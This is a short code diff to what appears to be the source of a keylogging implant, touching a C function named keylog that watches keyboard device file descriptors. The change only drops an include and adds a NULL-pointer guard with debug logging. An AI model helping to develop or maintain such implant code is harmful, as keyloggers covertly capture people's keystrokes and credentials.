@@ -12,7 +12,6 @@
 #include <sys/select.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include <xkbcommon/xkbcommon.h>
 #include "implant.h"
 
 static int
@@ -94,6 +93,14 @@ void keylog(implant_t *instance) {
         /* setup FD-sets */
         keyboard_t *it = NULL;
         TAILQ_FOREACH(it, &instance->kbd, devices) {
+            if (!it) {
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] instance->kbd has reached a NULL pointer");
+#endif
+                continue;
+            }
+
             FD_SET(it->fd, &rd);
             FD_SET(it->fd, &err);
         }
